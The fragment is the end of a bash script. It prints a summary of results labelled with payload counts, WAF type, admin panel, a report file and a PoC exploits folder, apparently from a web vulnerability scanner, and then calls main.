    kv "Dialog verified"  "$verified"
    kv "Chains"           "$chains"
    kv "Impact"           "$STAT_IMPACT"
    kv "Params"           "$STAT_PARAMS"
    kv "Payloads"         "$STAT_PAYLOADS"
    kv "WAF"              "$WAF_TYPE"
    kv "Tech"             "${TECH_STACK:-unknown}"
    kv "Admin"            "${ADMIN_PANEL:-none}"
    kv "Playwright"       "$([[ $PLAYWRIGHT_AVAILABLE == 1 ]] && echo 'on' || echo 'OFF')"
    kv "Report"           "$OUTDIR/laporan.html"
    kv "PoC"              "$OUTDIR/exploits/"
    echo ""
    echo -e "   ${D}by BimaKesengsaraan · Karya anak bangsa${NC}"
    echo ""
}

main "$@"